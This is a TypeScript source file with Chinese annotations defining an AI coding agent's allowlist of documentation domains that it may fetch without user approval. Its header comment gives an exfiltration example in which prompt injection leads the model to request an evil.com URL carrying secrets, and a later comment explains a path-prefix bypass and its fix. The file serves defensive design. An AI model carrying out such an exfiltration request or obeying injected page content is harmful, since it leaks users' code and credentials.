/**
 * ============================================================================
 *  【文件总览】src/tools/WebFetchTool/preapproved.ts —— 域名预批准白名单
 * ============================================================================
 *
 *  【一句话定位】
 *  一份硬编码的「可信域名清单」+ 一个判断函数。对这些域名，WebFetch 可以
 *  **跳过用户授权弹窗**直接抓取；其它域名则必须用户点头。
 *
 *  【在架构中的位置】
 *      模型发起 WebFetch(url)
 *        └─> WebFetchTool.checkPermissions()          ← WebFetchTool.ts
 *              └─> isPreapprovedHost(hostname, path)  ← ★ 本文件
 *                    └─> 命中 → 直接返回 { behavior: 'allow' }
 *                        未命中 → 走常规权限流程（deny / ask / allow 规则）
 *             WebFetchTool.call()
 *              └─> isPreapprovedUrl(url)              ← utils.ts（再包一层 URL 解析）
 *                    └─> isPreapprovedHost()          ← ★ 本文件
 *
 *  注意命中白名单有**两个**后果，不止"免弹窗"：
 *    ① 免权限弹窗（checkPermissions 直接 allow）
 *    ② 换一套宽松的版权措辞（prompt.ts 的 makeSecondaryModelPrompt）
 *    ③ 若响应本身就是 text/markdown 且不太长，直接原样返回，省掉一次小模型调用
 *
 *  【为什么要有这份白名单？——三重安全考量（这是本文件的核心）】
 *
 *  1) 防止「数据外传（data exfiltration）」——最重要的一条。
 *     WebFetch 是 GET 请求，而 URL 是可以携带任意内容的。恶意网页/提示词注入
 *     可以诱使模型发出 https://evil.com/?secret=<读到的密钥> 这样的请求，
 *     把本机代码、环境变量偷偷送出去。所以**默认策略是"用户没给过的域名一律
 *     不许抓"**（这个默认拒绝在 WebFetchTool.checkPermissions 里兜底）。
 *     白名单是唯一的例外通道，且只包含「程序员查文档必用、且不太可能被用来
 *     传数据」的站点。
 *
 *  2) 法律/版权考量。见 prompt.ts 的说明：白名单里的官方文档站可以自由引用；
 *     白名单外的内容受版权保护，只能引用 125 字符。
 *
 *  3) ⚠️ 这份白名单 **只对 WebFetch 生效，绝不能被沙箱（sandbox）继承**。
 *     这是文件头那段英文 SECURITY WARNING 的重点，务必理解：
 *       · WebFetch 只发 GET，且不带 cookie / 不带本机凭据 → 即使打白名单也难以外传；
 *       · 而沙箱网络规则一旦放开，就意味着可以对该域名 **POST / 上传文件**；
 *       · huggingface.co、kaggle.com、nuget.org 这类站点**允许上传文件**，
 *         如果沙箱也信任这份名单，一次 POST 就能把整个仓库传上去。
 *     所以仓库里专门有一个测试
 *     （test/utils/sandbox/webfetch-preapproved-separation.test.ts）
 *     来断言"沙箱网络限制不继承本名单"，防止有人日后图省事复用它。
 *
 *  【本文件包含什么】
 *   1. PREAPPROVED_HOSTS   Set<string>，白名单原始数据（主机名，或 主机+路径前缀）
 *   2. HOSTNAME_ONLY / PATH_PREFIXES  启动时一次性拆好的两份索引（见下方 IIFE）
 *   3. isPreapprovedHost() 唯一对外函数：给 hostname + pathname，返回是否命中
 *
 *  【TS 语法速查】
 *   - `new Set([...])`            ≈ Java 的 new HashSet<>(List.of(...))，O(1) 查找
 *   - `Map<string, string[]>`     ≈ Java 的 Map<String, List<String>>
 *   - `export const X = (() => { ... })()`  **立即执行函数（IIFE）**。
 *                                 ≈ Java 的 static { ... } 静态初始化块：
 *                                 模块加载时立刻跑一遍，把结果赋给常量。
 *                                 这里用它做"启动一次、之后 O(1)"的预处理。
 *   - `const { A, B } = (...)()`  解构赋值：把返回对象的两个字段拆成两个常量
 *   - `for (const x of arr)`      ≈ Java 的 for-each
 *   - `? :` / `??`                三元 / 空值合并（见 utils.ts 的说明）
 *   - `!`                         非空断言，仅在测试/断言场景用，本文件未出现
 * ============================================================================
 */

// For legal and security concerns, we typically only allow Web Fetch to access
// domains that the user has provided in some form. However, we make an
// exception for a list of preapproved domains that are code-related.
//
// SECURITY WARNING: These preapproved domains are ONLY for WebFetch (GET requests only).
// The sandbox system deliberately does NOT inherit this list for network restrictions,
// as arbitrary network access (POST, uploads, etc.) to these domains could enable
// data exfiltration. Some domains like huggingface.co, kaggle.com, and nuget.org
// allow file uploads and would be dangerous for unrestricted network access.
//
// See test/utils/sandbox/webfetch-preapproved-separation.test.ts for verification
// that sandbox network restrictions require explicit user permission rules.

export const PREAPPROVED_HOSTS = new Set([
  // Anthropic
  'platform.claude.com',
  'code.claude.com',
  'modelcontextprotocol.io',
  'github.com/anthropics',
  'agentskills.io',

  // Top Programming Languages
  'docs.python.org', // Python
  'en.cppreference.com', // C/C++ reference
  'docs.oracle.com', // Java
  'learn.microsoft.com', // C#/.NET
  'developer.mozilla.org', // JavaScript/Web APIs (MDN)
  'go.dev', // Go
  'pkg.go.dev', // Go docs
  'www.php.net', // PHP
  'docs.swift.org', // Swift
  'kotlinlang.org', // Kotlin
  'ruby-doc.org', // Ruby
  'doc.rust-lang.org', // Rust
  'www.typescriptlang.org', // TypeScript

  // Web & JavaScript Frameworks/Libraries
  'react.dev', // React
  'angular.io', // Angular
  'vuejs.org', // Vue.js
  'nextjs.org', // Next.js
  'expressjs.com', // Express.js
  'nodejs.org', // Node.js
  'bun.sh', // Bun
  'jquery.com', // jQuery
  'getbootstrap.com', // Bootstrap
  'tailwindcss.com', // Tailwind CSS
  'd3js.org', // D3.js
  'threejs.org', // Three.js
  'redux.js.org', // Redux
  'webpack.js.org', // Webpack
  'jestjs.io', // Jest
  'reactrouter.com', // React Router

  // Python Frameworks & Libraries
  'docs.djangoproject.com', // Django
  'flask.palletsprojects.com', // Flask
  'fastapi.tiangolo.com', // FastAPI
  'pandas.pydata.org', // Pandas
  'numpy.org', // NumPy
  'www.tensorflow.org', // TensorFlow
  'pytorch.org', // PyTorch
  'scikit-learn.org', // Scikit-learn
  'matplotlib.org', // Matplotlib
  'requests.readthedocs.io', // Requests
  'jupyter.org', // Jupyter

  // PHP Frameworks
  'laravel.com', // Laravel
  'symfony.com', // Symfony
  'wordpress.org', // WordPress

  // Java Frameworks & Libraries
  'docs.spring.io', // Spring
  'hibernate.org', // Hibernate
  'tomcat.apache.org', // Tomcat
  'gradle.org', // Gradle
  'maven.apache.org', // Maven

  // .NET & C# Frameworks
  'asp.net', // ASP.NET
  'dotnet.microsoft.com', // .NET
  'nuget.org', // NuGet
  'blazor.net', // Blazor

  // Mobile Development
  'reactnative.dev', // React Native
  'docs.flutter.dev', // Flutter
  'developer.apple.com', // iOS/macOS
  'developer.android.com', // Android

  // Data Science & Machine Learning
  'keras.io', // Keras
  'spark.apache.org', // Apache Spark
  'huggingface.co', // Hugging Face
  'www.kaggle.com', // Kaggle

  // Databases
  'www.mongodb.com', // MongoDB
  'redis.io', // Redis
  'www.postgresql.org', // PostgreSQL
  'dev.mysql.com', // MySQL
  'www.sqlite.org', // SQLite
  'graphql.org', // GraphQL
  'prisma.io', // Prisma

  // Cloud & DevOps
  'docs.aws.amazon.com', // AWS
  'cloud.google.com', // Google Cloud
  'learn.microsoft.com', // Azure
  'kubernetes.io', // Kubernetes
  'www.docker.com', // Docker
  'www.terraform.io', // Terraform
  'www.ansible.com', // Ansible
  'vercel.com/docs', // Vercel
  'docs.netlify.com', // Netlify
  'devcenter.heroku.com', // Heroku

  // Testing & Monitoring
  'cypress.io', // Cypress
  'selenium.dev', // Selenium

  // Game Development
  'docs.unity.com', // Unity
  'docs.unrealengine.com', // Unreal Engine

  // Other Essential Tools
  'git-scm.com', // Git
  'nginx.org', // Nginx
  'httpd.apache.org', // Apache HTTP Server
])

// Split once at module load so lookups are O(1) Set.has() for the common
// hostname-only case, falling back to a small per-host path-prefix list
// for the handful of path-scoped entries (e.g., "github.com/anthropics").
// 中文补充：上面那段英文说的是「为什么拆成两份索引」——性能考虑。
// 白名单里绝大多数条目是纯主机名（如 'docs.python.org'），只有极少数带路径
// （如 'github.com/anthropics' 表示"只信任这个 org 下的页面"）。
// 如果每次判断都对全表做一次字符串前缀匹配，就是 O(n)；
// 所以在**模块加载时**先把它们拆成：
//    HOSTNAME_ONLY : Set<string>       —— 纯主机名，命中即通过，O(1)
//    PATH_PREFIXES : Map<string, string[]> —— 主机名 → 该主机下允许的路径前缀列表
// 之后每次查询都只是一次 Set.has + 至多几次 Map.get。
// 只跑一次、结果存常量，这个「立即执行函数」写法 ≈ Java 的 static 初始化块。
const { HOSTNAME_ONLY, PATH_PREFIXES } = (() => {
  const hosts = new Set<string>()
  const paths = new Map<string, string[]>()
  for (const entry of PREAPPROVED_HOSTS) {
    // 有 '/' 说明这条是「主机 + 路径前缀」，没有则是纯主机名。
    // indexOf 返回 -1 表示没找到（Java 的 String.indexOf 同理，不是 exception）。
    const slash = entry.indexOf('/')
    if (slash === -1) {
      hosts.add(entry)
    } else {
      // 切成 host 和 path 两段：'github.com/anthropics'
      //   → host = 'github.com', path = '/anthropics'（注意 path 保留开头的 '/'）
      const host = entry.slice(0, slash)
      const path = entry.slice(slash)
      const prefixes = paths.get(host)
      if (prefixes) prefixes.push(path)
      else paths.set(host, [path])
    }
  }
  return { HOSTNAME_ONLY: hosts, PATH_PREFIXES: paths }
})()

/**
 * 判断「这个 host + 这个路径」是否在预批准白名单内。
 *
 * 【做什么】白名单的唯一对外查询入口。
 * 【为什么需要】WebFetch 默认拒绝任何用户没授权过的域名（防数据外传），
 *              本函数是那条默认规则上的「例外闸门」——命中就免弹窗直接放行。
 *
 * 【入参】hostname  已是小写主机名，如 'docs.spring.io'（不含协议、端口、query）
 *        pathname  路径部分，如 '/anthropics' 或 '/spring-boot/docs/'
 * 【返回】true = 命中白名单，可以免授权抓取
 *
 * 【关键步骤】
 *   ① 先查纯主机名集合 HOSTNAME_ONLY，命中直接 true（绝大多数请求走这条路，O(1)）
 *   ② 未命中则查 PATH_PREFIXES，看该主机是否登记了路径前缀
 *   ③ 逐个前缀比对，且必须满足「路径段边界」约束（见下方注释）
 *   ④ 都不匹配 → false，交给常规权限流程去弹窗问用户
 */
export function isPreapprovedHost(hostname: string, pathname: string): boolean {
  if (HOSTNAME_ONLY.has(hostname)) return true
  const prefixes = PATH_PREFIXES.get(hostname)
  if (prefixes) {
    for (const p of prefixes) {
      // 中文补充：这一段是**安全修复**，不是为了省事。
      // 如果只写 pathname.startsWith(p)，那么 '/anthropics' 会把
      // '/anthropics-evil/malware' 也判成合法——攻击者只要在白名单 org 名下
      // 建一个名字以 anthropics 开头的仓库，就能白嫖免授权抓取。
      // 所以必须要求：要么**完全相等**，要么前缀后面紧跟一个 '/'
      // （即 p 必须是一个完整的路径段），才放行。
      // 这是 URL 前缀匹配的经典陷阱，Java 里做 startsWith 判断时同样要小心。
      // Enforce path segment boundaries: "/anthropics" must not match
      // "/anthropics-evil/malware". Only exact match or a "/" after the
      // prefix is allowed.
      if (pathname === p || pathname.startsWith(p + '/')) return true
    }
  }
  return false
}
